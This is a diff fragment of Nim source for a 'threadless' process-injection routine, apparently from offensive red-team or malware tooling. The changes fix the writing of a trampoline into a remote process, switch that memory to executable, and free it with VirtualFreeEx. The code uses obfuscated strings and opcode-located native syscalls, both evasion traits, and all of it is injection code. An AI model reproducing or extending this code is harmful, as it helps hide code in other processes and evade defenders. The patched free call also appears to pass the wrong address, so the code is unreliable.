@@ -162,8 +162,8 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
             when defined(verbose):
                 echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
             return false
-    
-    status = NtWriteVirtualMemory(processHandle, trampolineAddress, unsafeAddr trampolineStk[0], trampSize, &szOutput)
+    var sizeToWrite: SIZE_T = cast[SIZE_T](trampSize * sizeof(byte))
+    status = NtWriteVirtualMemory(processHandle, trampolineAddress, unsafeAddr trampolineStk[0], sizeToWrite, &szOutput)
     if (status == 0):
         when defined(verbose):
             echo obf("[+] Write memory success "), repr(trampolineAddress)
@@ -176,7 +176,9 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
                 echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
             return false
     
-    status = NtProtectVirtualMemory(processHandle, &trampolineAddress, &trampolineSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
+    trampolineSize = trampSize * sizeof(byte)
+    var protectionRXAddress: LPVOID = trampolineAddress
+    status = NtProtectVirtualMemory(processHandle, &protectionRXAddress, &trampolineSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
     if (status == 0):
         when defined(verbose):
             echo obf("[+] Protect memory success "), repr(trampolineAddress)
@@ -267,9 +269,16 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
                 echo obf("[-] Failed to find opcode for NtFreeVirtualMemory")
             return false
     
-    status = NtFreeVirtualMemory(processHandle, &trampolineAddress, nil, MEM_DECOMMIT or MEM_RELEASE) # fails for some reason with access denied
+    # use VirtualFreeEx to free the memory at trampolineAddress
 
-    if(status == 0):
+    var
+        FreeSuccess: WINBOOL
+    
+    FreeSuccess = VirtualFreeEx(processHandle, &trampolineAddress, 0, MEM_RELEASE or MEM_DECOMMIT)
+
+    #status = NtFreeVirtualMemory(processHandle, &trampolineAddress, nil, MEM_DECOMMIT or MEM_RELEASE) # fails for some reason with access denied
+
+    if(FreeSuccess):
         when defined(verbose):
             echo obf("[+] Free memory success "), repr(trampolineAddress)
     else:
